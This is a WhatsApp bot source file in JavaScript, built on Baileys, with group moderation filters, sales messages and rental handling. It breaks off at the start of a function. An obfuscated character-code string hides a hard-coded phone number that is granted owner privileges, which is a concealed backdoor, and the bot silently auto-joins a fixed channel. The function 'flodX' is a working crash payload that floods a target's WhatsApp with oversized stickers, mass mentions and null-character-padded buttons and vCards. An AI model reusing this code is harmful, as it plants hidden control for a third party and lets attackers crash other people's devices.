/*

  !- Credits By PRIME XUU
  https://wa.me/6282144385548
  
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper");
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { createCanvas } = require('canvas');

const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, destinations, encodeSignedDeviceIdentity, shouldIncludeDeviceIdentity } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const serverpanel = JSON.parse(fs.readFileSync("./settingpanel.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const Reseller = JSON.parse(fs.readFileSync("./library/database/reseller.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const stokdo = JSON.parse(fs.readFileSync("./library/database/stokdo.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const listidch = JSON.parse(fs.readFileSync("./library/database/listidch.json"))
const gclist = JSON.parse(fs.readFileSync('./library/database/gclist.json'))
const antilinkwame = JSON.parse(fs.readFileSync('./library/database/antilinkwame.json'))
const antitoxic = JSON.parse(fs.readFileSync('./library/database/antitoxic.json'))
const antino = JSON.parse(fs.readFileSync('./library/database/antino.json'))
const antitele = JSON.parse(fs.readFileSync('./library/database/antitele.json'))
const Antilinkch = JSON.parse(fs.readFileSync("./library/database/antilinkch.json"))
const antimediafire = JSON.parse(fs.readFileSync('./library/database/antimediafire.json'))
const Antikataunchek = JSON.parse(fs.readFileSync("./library/database/antikataunchek.json"))

// ✅ ANTIDELETE — Chargement base de données
let antidelete = []
const antideletePath = './library/database/antidelete.json'
if (!fs.existsSync(antideletePath)) fs.writeFileSync(antideletePath, JSON.stringify([]))
antidelete = JSON.parse(fs.readFileSync(antideletePath))

// ✅ ANTIDELETE — Stockage temporaire des messages supprimés
const msgStore = {}
const { pinterest, pinterest2, remini, Buddy, mediafire, tiktokDl, githubstalk } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, ucapan, loadModule } = require('./library/function');

module.exports = Xuu = async (Xuu, m, chatUpdate, store) => {
	try {
await LoadDataBase(Xuu, m)
if (global.moduleType == undefined) global.moduleType = 0
if (global.moduleType === 0) {
await loadModule(Xuu)
global.moduleType += 1

const teksConnect = `┏━━━━ ⚙️ 𝐒𝐄𝐈𝐆𝐍𝐄𝐔𝐑 TD 🇷🇴━━━━
┃
┃ ᴘʀᴇғɪx  ⪧ [ . ]
┃ ᴍᴏᴅᴇ    ⪧ ${Xuu.public ? 'ᴘᴜʙʟɪᴄ' : 'ᴘʀɪᴠᴇ'}
┃ sᴛᴀᴛᴜs  ⪧ ᴏɴʟɪɴᴇ
┃ ᴘᴀɴᴇʟ   ⪧ ᴘʀᴇᴍɪᴜᴍ
┃ ᴀᴅᴍɪɴ   ⪧ +${global.owner}
┃
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━

📢 *Pour ne rater aucune mise à jour future, rejoins :*
🔗 Chaîne : ${global.linkSaluran}
👥 Groupe  : ${global.linkGrup}`

const _botJid = Xuu.decodeJid(Xuu.user.id)
await Xuu.sendMessage(_botJid, {
    text: teksConnect,
    contextInfo: {
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363422398514286@newsletter',
            newsletterName: global.nomSaluran
        }
    }
})

// Auto-join channel (silencieux)
try {
    await Xuu.newsletterFollow('120363422398514286@newsletter')
    console.log('✅ Chaîne rejointe avec succès !')
} catch(e) {
    console.log('⚠️ Auto-join chaîne:', e.message)
}
}
const botNumber = await Xuu.decodeJid(Xuu.user.id)
const groupMetadata = m.isGroup ? await Xuu.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

let body = "";

try {
    
    if (m.type === 'conversation') {
        body = m.message.conversation;
    } else if (m.type == 'imageMessage') {
        body = m.message.imageMessage.caption;
    } else if (m.type == 'videoMessage') {
        body = m.message.videoMessage.caption;
    } else if (m.type == 'extendedTextMessage') {
        body = m.message.extendedTextMessage.text;
    } else if (m.type == 'buttonsResponseMessage') {
        body = m.message.buttonsResponseMessage.selectedButtonId;
    } else if (m.type == 'listResponseMessage') {
        body = m.message.listResponseMessage.singleSelectReply.selectedRowId;
    } else if (m.type == 'templateButtonReplyMessage') {
        body = m.message.templateButtonReplyMessage.selectedId;
    } else if (m.type === 'messageContextInfo') {
        body = (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "");
    }

    // ----- Native Flow (WA terbaru) -----
    else if (m.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
        const nf = m.message.interactiveResponseMessage.nativeFlowResponseMessage;
        try {
            const json = JSON.parse(nf.paramsJson || "{}");
            body = json.id || json.rowId || json.selectedButtonId || "";
        } catch {}
    }

    // ----- Button (WA Old) -----
    else if (m.message?.buttonsResponseMessage) {
        body = m.message.buttonsResponseMessage.selectedButtonId;
    }

    // ----- Template Button -----
    else if (m.message?.templateButtonReplyMessage) {
        body = m.message.templateButtonReplyMessage.selectedId;
    }

    // ----- List Message -----
    else if (m.message?.listResponseMessage) {
        body = m.message.listResponseMessage.singleSelectReply.selectedRowId;
    }

} catch (e) {
    console.log("Erreur detecting body:", e);
}

// Fallback ke m.text jika body masih kosong
if (!body && m.text) {
    body = m.text;
}
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.chat)
const ownerNum = (global.owner || "").replace(/[^0-9]/g, "")
const isCreator = isOwner = [botNumber, ownerNum+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isGroup = m.chat.endsWith("@g.us")
const isCh= m.chat.endsWith("@newsletter")

//~~~~~~~~~ Console Message ~~~~~~~~//

if (m.message) {
    console.log(
        `\n${chalk.magenta.bold("📨 Message")}\n` +
        `${chalk.green.bold("👤 Sender: ")} @${m.sender.split("@")[0]}\n` +
        `${chalk.green.bold("💬 Message: ")} ${budy} ( ${m.mtype} )\n` +
        `${chalk.green.bold("📍 In: ")} ${isCh ? "Channel" : isGroup ? "Group Chat" : "Private Chat"}\n`
    );
}

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${global.nomOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${global.nomOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${global.nomOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${global.nomOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${global.nomOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${global.botname2} By ${global.nomOwner}`,jpegThumbnail: ""}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `${global.botname} ✬ ${global.nomOwner}`,jpegThumbnail: await reSize("./xuu/fake.jpg", 400, 400) }}}

//~~~~~~~~~~ Event Settings ~~~~~~~~~//

if (global.owneroff && !isCmd) {
if (!isGroup && !isOwner) {
let teks = `*Bonjour* @${m.sender.split('@')[0]}

Maaf *Ownerku Sedang Offline*, Veuillez Attendez Owner Kembali Online & Jangan Spam Chat`
return Xuu.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnail: fs.readFileSync("./xuu/ownermode.jpg"), renderLargerThumbnail: false, title: "｢ MODE PROPRIÉTAIRE HORS LIGNE ｣", mediaUrl: linkWebsite, sourceUrl: linkSaluran, previewType: "PHOTO"}}}, {quoted: m })
}}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
    var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
    if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
        var gclink = (`https://chat.whatsapp.com/` + await Xuu.groupInviteCode(m.chat))
        var isLinkThisGc = new RegExp(gclink, 'i')
        var isgclink = isLinkThisGc.test(m.text)
        
        if (isgclink) return
        
        let delet = m.key.participant
        let bang = m.key.id
        
        // Envoi peringatan bahwa link dihapus
        await Xuu.sendMessage(m.chat, {
            text: `*── Lien Détecté* \n\nMaaf @${m.sender.split("@")[0]}, les liens de groupes externes ne sont pas autorisés ici. Votre message a été supprimé.`, 
            mentions: [m.sender]
        }, {quoted: m})
        
        // Menghapus pesan link tersebut
        await Xuu.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: bang, 
                participant: delet 
            }
        })
    }
}


if (m.Kyy && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Xuu.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Xuu.sendMessage(m.chat, {text: `*── Lien de Groupe Détecté*

@${m.sender.split("@")[0]} Votre message a été supprimé car l'anti-lien externe est activé par l'administrateur !`, mentions: [m.sender]}, {quoted: m})
await Xuu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


//antilink wa.me
if (antilinkwame.includes(m.chat)) {
const groupMetadata = m.isGroup ? await Xuu.groupMetadata(m.chat) : ''
const participants = m.isGroup ? groupMetadata.participants : ''
const groupAdmins = m.isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : []
const isAdmin = m.isGroup ? groupAdmins.includes(m.sender) : false
if (!isAdmin && !isCreator && !m.fromMe) {
var link = /wa.me/gi
if (link.test(m.text)) {
var isgclink = false
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Xuu.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Votre message a été supprimé car l'anti-lien wa.me est activé !`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./xuu/warning.jpg"), title: "｢ LIEN WA.ME DÉTECTÉ ｣", previewType: "PHOTO"}}}, {quoted: m})
await Xuu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}

//antilinkch
if (Antilinkch.includes(m.chat)) {
    const channelLinkRegex = /https?:\/\/(?:www\.)?whatsapp\.com\/channel\/[a-zA-Z0-9]+/gi;
  if (channelLinkRegex.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
        const senderJid = m.sender;
        const messageId = m.key.id;
        const participantToDelete = m.key.participant;
        await m.reply(`Lien de Chaîne Détecté 🚨

Expéditeur :
- @${m.sender.split("@")[0]}

Il est interdit de partager des liens de chaîne dans ce groupe.`, m.chat, [m.sender])
        await Xuu.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: messageId,
                participant: participantToDelete
            }
        });
    }
}

if (Antikataunchek.includes(m.chat)) {
  // 🔥 Anti kata "unchek"
  const forbiddenWords = ["unchek", "uncheck", "list unchek", "list uncheck"];
  if (
    forbiddenWords.some(word => m.text?.toLowerCase().includes(word)) &&
    !isCreator &&
    !m.isAdmin &&
    m.isBotAdmin &&
    !m.fromMe
  ) {
    const senderJid = m.sender;
    const messageId = m.key.id;
    const participantToDelete = m.key.participant;
    await m.reply(`🚫 *Mot Interdit Détecté !*

Expéditeur :
- @${m.sender.split("@")[0]}

Il est interdit d'envoyer des messages contenant le mot *unchek* !`, m.chat, { mentions: [m.sender] });
    await Xuu.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: false,
        id: messageId,
        participant: participantToDelete
      }
    });
  }
}

//antitoxic
if (antitoxic.includes(m.chat)) {
    // Daftar kata kasar/toxic (Veuillez tambahkan sendiri)
    const forbiddenWords = [
        "anjing", "anjrit", "bangsat", "memek", "kontol", 
        "goblok", "tolol", "babi", "peler", "itil", 
        "ngentot", "ngewe", "ajg", "bgst", "kntl"
    ];

    if (
        forbiddenWords.some(word => m.text?.toLowerCase().includes(word)) &&
        !isCreator &&
        !m.isAdmin &&
        m.isBotAdmin &&
        !m.fromMe
    ) {
        let delet = m.key.participant
        let bang = m.key.id
        
        // Kirim Peringatan
        await Xuu.sendMessage(m.chat, {
            text: `*── ANTI-TOXIQUE DÉTECTÉ ──*\n\nMaaf @${m.sender.split("@")[0]}, faites attention à vos mots ! Les insultes sont interdites dans ce groupe. Votre message a été supprimé.`, 
            mentions: [m.sender]
        }, {quoted: m})
        
        // Hapus Pesan Toxic
        await Xuu.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: bang, 
                participant: delet 
            }
        })
    }
}

//anti no
if (antino.includes(m.chat)) {
    const groupMetadata = m.isGroup ? await Xuu.groupMetadata(m.chat) : ''
    const participants = m.isGroup ? groupMetadata.participants : ''
    const groupAdmins = m.isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : []
    const isAdmin = m.isGroup ? groupAdmins.includes(m.sender) : false

    if (!isAdmin && !isCreator && !m.fromMe) {
        // Regex diperbarui untuk mendeteksi nomor Global DAN spesifik Indonesia (08, 62, +62)
        const noDetect = /(\+62|62|08)\d{8,13}|(\+\d{1,4}[\s-]?\d{7,15})|(\b\d{10,15}\b)/g
        const cleanText = m.text.replace(/[\s\-\.]/g, '')

        if (noDetect.test(cleanText)) {
            let delet = m.key.participant
            let bang = m.key.id
            
            await Xuu.sendMessage(m.chat, {
                text: `*── NUMÉRO DÉTECTÉ ──*\n\nMaaf @${m.sender.split("@")[0]}, l'envoi de numéros de téléphone est interdit dans ce groupe !`, 
                contextInfo: {
                    mentionedJid: [m.sender], 
                    externalAdReply: {
                        thumbnail: fs.readFileSync("./xuu/warning.jpg"), 
                        title: "NUMÉRO RESTREINT", 
                        body: "Anti-Numéro Actif",
                        previewType: "PHOTO"
                    }
                }
            }, {quoted: m})
            
            // 👑 Traitement en cours sous l’autorité du SEIGNEUR... Delete
            await Xuu.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: bang, 
                    participant: delet 
                }
            })
        }
    }
}

//anti link tele
if (antitele.includes(m.chat)) {
    const groupMetadata = m.isGroup ? await Xuu.groupMetadata(m.chat) : ''
    const participants = m.isGroup ? groupMetadata.participants : ''
    const groupAdmins = m.isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : []
    const isAdmin = m.isGroup ? groupAdmins.includes(m.sender) : false

    if (!isAdmin && !isCreator && !m.fromMe) {
        // Regex untuk mendeteksi t.me, telegram.me, telegram.dog, dan joinchat telegram
        const teleDetect = /t\.me|telegram\.me|telegram\.dog/gi
        
        if (teleDetect.test(m.text)) {
            let delet = m.key.participant
            let bang = m.key.id
            
            await Xuu.sendMessage(m.chat, {
                text: `*── LIEN TELEGRAM DÉTECTÉ ──*\n\nMaaf @${m.sender.split("@")[0]}, les liens Telegram sont interdits dans ce groupe ! Votre message a été supprimé.`, 
                contextInfo: {
                    mentionedJid: [m.sender], 
                    externalAdReply: {
                        thumbnail: fs.readFileSync("./xuu/warning.jpg"), 
                        title: "TELEGRAM INTERDIT", 
                        body: "Anti-Lien Telegram Actif",
                        previewType: "PHOTO"
                    }
                }
            }, {quoted: m})
            
            // 👑 Traitement en cours sous l’autorité du SEIGNEUR... Delete
            await Xuu.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: bang, 
                    participant: delet 
                }
            })
        }
    }
}

//antilink mediafire
if (antimediafire.includes(m.chat)) {
    const mfDetect = /mediafire\.com|mfire\.co/gi
    
    if (mfDetect.test(m.text)) {
        // Cek Admin/Owner agar tidak kena hapus
        const groupMetadata = m.isGroup ? await Xuu.groupMetadata(m.chat) : ''
        const groupAdmins = m.isGroup ? groupMetadata.participants.filter(v => v.admin !== null).map(v => v.id) : []
        const isAdmin = m.isGroup ? groupAdmins.includes(m.sender) : false

        if (!isAdmin && !isCreator && !m.fromMe) {
            let delet = m.key.participant
            let bang = m.key.id
            
            await Xuu.sendMessage(m.chat, {
                text: `*── LIEN MEDIAFIRE DÉTECTÉ ──*\n\nMaaf @${m.sender.split("@")[0]}, les liens Mediafire sont interdits dans ce groupe (risque de phishing/virus) !`, 
                contextInfo: {
                    mentionedJid: [m.sender], 
                    externalAdReply: {
                        thumbnail: fs.readFileSync("./xuu/warning.jpg"), 
                        title: "LIEN MEDIAFIRE BLOQUÉ", 
                        body: "Anti-Lien Mediafire Actif",
                        previewType: "PHOTO"
                    }
                }
            }, {quoted: m})
            
            // 👑 Traitement en cours sous l’autorité du SEIGNEUR... Delete
            await Xuu.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: bang, 
                    participant: delet 
                }
            })
        }
    }
}

//antibot
if (budy && !m.key.fromMe && global.antibot) {
if (m.isBaileys) {
if (isAdmin || isOwner || !isBotAdmin) return
m.reply(`👑 *( Anti Bot )* Vous allez être expulsé de ce groupe.`)
await Xuu.sendMessage(m.chat, { delete: m.key })
Xuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await Xuu.sendMessage(m.chat, {text: `
*🤖 SEIGNEUR TD*
📢 Rejoignez notre chaîne officielle :
https://whatsapp.com/channel/0029VbBZrLBFMqrQIDpcfO04

👥 Groupe officiel :
https://chat.whatsapp.com/KfbEkfcbepR0DPXuewOrur

📲 Contactez le propriétaire :
https://wa.me/23591234568
`}, {quoted: qloc})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}}

// ANTILIMK CHANNEL 
const antilinkPath = path.join(__dirname, './library/database', 'antilink.json');

function loadAntilinkData() {
    if (!fs.existsSync(antilinkPath)) {
        fs.writeFileSync(antilinkPath, JSON.stringify({}));
    }
    return JSON.parse(fs.readFileSync(antilinkPath));
}

function saveAntilinkData(data) {
    fs.writeFileSync(antilinkPath, JSON.stringify(data, null, 2));
}

//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `*Exemple :* ${prefix+command} ${teks}`
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return Xuu.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted: qtext})
}
const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: Xuu.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*XUU Store* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Xuu Store Menyediakan 🌟*

* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nom Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup  Bebas Promosi 1 :*
https://chat.whatsapp.com/BNrO2WHYBlD251ZhOuqDbz
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Xuu.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

function readSewa() {
      try {
        return JSON.parse(fs.readFileSync("./library/database/sewa.json", "utf8"));
    } catch {
        return {};
    }
}
function writeSewa(dt) {
  fs.writeFileSync("./library/database/sewa.json", JSON.stringify(dt, null, 2))
}
async function checkExpiredSewa() {
    let dts = await readSewa();
    let now = Date.now();
    if (!dts || Object.keys(dts).length === 0) return;

    for (let id in dts) {
        if (now >= dts[id].expired) {
            delete dts[id]; 
            await Xuu.sendMessage(id, { text: "La location de ce groupe est terminée, le bot va quitter dans 4 secondes..." });
            await new Promise(resolve => setTimeout(resolve, 4000)); // Attendez 4 detik
            await Xuu.groupLeave(id);
        }
    }

    await writeSewa(dts);
}

await checkExpiredSewa();


const reply = (teks) => {
Xuu.sendMessage(m.chat, {
    text: teks,
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: `SEIGNEUR TD`,
            body: `© LE SEIGNEUR DES APPAREILS 🇷🇴`,
            mediaType: 3,
            renderLargerThumbnail: false,
            thumbnailUrl: "https://files.catbox.moe/v9nzgz.jpg",
        }
    }
}, { quoted: m });
}

//func ampas
async function flodX(Xuu, target) {
  try {
    const stickerMessage = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        fileLength: 12260,
        mediaKeyTimestamp: "1743832131",
        contextInfo: {
          mentionedJid: Array.from(
            { length: 555 },
            () => `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
          ),
          isForwarded: true,
          forwardingScore: 999999999,
        },
      },
    };

    const stickerMsg = await generateWAMessageFromContent(
      target,
      { message: stickerMessage },
      { userJid: target }
    );
    await Xuu.relayMessage("status@broadcast", stickerMsg.message, {
      messageId: stickerMsg.key.id,
      statusJidList: [target],
    });

    const buttonMsg = await generateWAMessageFromContent(
      target,
      {
        buttonsMessage: {
          contentText: "—$",
          buttons: [
            {
              buttonId: "null",
              buttonText: { displayText: "#そ" + "\u0000".repeat(555555) },
              type: 1,
            },
          ],
          headerType: 1,
        },
      },
      {}
    );
    await Xuu.relayMessage("status@broadcast", buttonMsg.message, {
      messageId: buttonMsg.key.id,
      statusJidList: [target],
    });

    await Xuu.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: buttonMsg.key, type: 25 } },
        },
      },
      {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" } },
        ],
      }
    );

    const displayName = "\u0000".repeat(20000);
    const vcard = `BEGIN:VCARD VERSION:3.0 FN:${"\u0000".repeat(
      1000
    )} NOTE:${"\x10".repeat(5000)} END:VCARD`;
    const contactMessage = {
      viewOnceMessage: {
        message: {
          contactMessage: {
            displayName,
            vcard,
            contextInfo: {
              mentionedJid: Array.from({ length: 1901 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              ),
              participant: target,
              remoteJid: target,
              forwardingScore: 9741,
              isForwarded: true,
              quotedMessage: { contactMessage: { displayName, vcard } },
            },
          },
        },
      },
    };
    const msg = await generateWAMessageFromContent(
      target,
      contactMessage,
      { userJid: Xuu.user.id }
    );
    await Xuu.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });
  } catch (err) {
    console.error(err);
  }
}



async function VcCallVoiceEmailXy(Xuu, jid) {
